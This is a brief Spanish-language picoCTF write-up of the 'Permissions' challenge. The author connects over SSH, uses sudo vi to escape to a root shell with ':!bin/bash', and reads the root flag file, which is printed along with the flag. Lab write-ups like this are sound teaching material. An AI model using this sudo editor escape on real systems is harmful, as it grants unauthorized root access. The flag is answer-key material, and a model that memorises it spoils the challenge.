### 🚩 [-Permissions]

**Descripción:** ¿Cuál es el objetivo principal del reto o la vulnerabilidad a explotar?
Can you read files in the root file?

**Solución:** primero entere al servidor utilizando el ssh 
`ssh  picoplayer@saturn.picoctf.net -p54567
`


- Luego que entre intente usar el sudo para poder ver lo que habia pero no tenia permisos 
- entonces use 
`picoplayer@challenge:~$ sudo vi test

`
- para luego poner varias veces esc para poder poner el :!bin/bash para que me de acceso como root y poder encontrar la bandera 
`root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
`




